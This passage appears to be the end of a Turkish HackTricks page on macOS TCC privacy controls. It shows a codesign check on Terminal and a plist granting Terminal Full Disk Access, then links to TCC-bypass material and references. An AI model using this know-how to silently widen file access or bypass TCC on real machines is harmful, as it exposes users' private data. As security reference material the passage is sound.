codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypass'ları


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## References

- [1] [macOS TCC.db'ye derinlemesine bakış - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - com.apple.macl'i izlemek için script (brunerd tarafından Gist)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [com.apple.macl'i izleme ve ele alma](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [macOS TCC User Privacy Protections'ı kazara ve tasarım gereği bypass etme](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Ana dizini değiştirme ve TCC'yi bypass etme, diğer adıyla CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
{{#include ../../../../banners/hacktricks-training.md}}
